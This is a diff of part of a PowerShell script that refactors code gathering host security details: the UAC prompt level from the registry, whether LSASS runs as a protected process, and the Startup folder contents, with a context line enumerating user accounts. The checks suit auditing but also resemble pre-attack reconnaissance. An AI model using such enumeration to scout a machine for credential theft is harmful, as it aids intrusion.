@@ -149,36 +149,76 @@ $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Na
 
 ############################################################################################################################################################
 
-Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }
+Function Get-RegistryValue {
+    param(
+        [string]$key,
+        [string]$value
+    )
+    try {
+        $regValue = (Get-ItemProperty -Path $key -Name $value -ErrorAction Stop).$value
+        return $regValue
+    } catch {
+        Write-Host "Error accessing registry key '$key' or value '$value': $_"
+        return $null
+    }
+}
 
+# Define registry key and value names
 $Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
 $ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
 $PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 
 
-$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
-$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name
+# Get registry values
+$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue -key $Key -value $ConsentPromptBehaviorAdmin_Name
+$PromptOnSecureDesktop_Value = Get-RegistryValue -key $Key -value $PromptOnSecureDesktop_Name
 
-If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
- 
-ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 
+# Determine UAC setting based on registry values
+if ($ConsentPromptBehaviorAdmin_Value -eq 0 -and $PromptOnSecureDesktop_Value -eq 0) {
+    $UAC = "Never notify"
+} elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 0) {
+    $UAC = "Notify me only when apps try to make changes to my computer (do not dim my desktop)"
+} elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 1) {
+    $UAC = "Notify me only when apps try to make changes to my computer (default)"
+} elseif ($ConsentPromptBehaviorAdmin_Value -eq 2 -and $PromptOnSecureDesktop_Value -eq 1) {
+    $UAC = "Always notify"
+} else {
+    $UAC = "Unknown"
+}
 
-ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
- 
-ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
- 
-Else{ $UAC = "Unknown" } 
-
-############################################################################################################################################################
-
-$lsass = Get-Process -Name "lsass"
-
-if ($lsass.ProtectedProcess) {$lsass = "LSASS is running as a protected process."} 
-
-else {$lsass = "LSASS is not running as a protected process."}
+Write-Host "User Account Control (UAC) setting: $UAC"
 
 ############################################################################################################################################################
 
-$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
+# Check if LSASS is running as a protected process
+try {
+    $lsass = Get-Process -Name "lsass" -ErrorAction Stop
+    if ($lsass.ProtectedProcess) {
+        $lsassStatus = "LSASS is running as a protected process."
+    } else {
+        $lsassStatus = "LSASS is not running as a protected process."
+    }
+} catch {
+    $lsassStatus = "Unable to check LSASS process: $_"
+}
+
+Write-Host $lsassStatus
+
+############################################################################################################################################################
+
+# Get startup folder contents
+$StartupFolderPath = [Environment]::GetFolderPath("Startup")
+if (Test-Path $StartupFolderPath) {
+    $StartUp = Get-ChildItem -Path $StartupFolderPath
+    if ($StartUp) {
+        Write-Host "Items in Startup folder:"
+        $StartUp | ForEach-Object { Write-Host $_.Name }
+    } else {
+        Write-Host "Startup folder is empty."
+    }
+} else {
+    Write-Host "Startup folder not found."
+}
+
 
 ############################################################################################################################################################
 
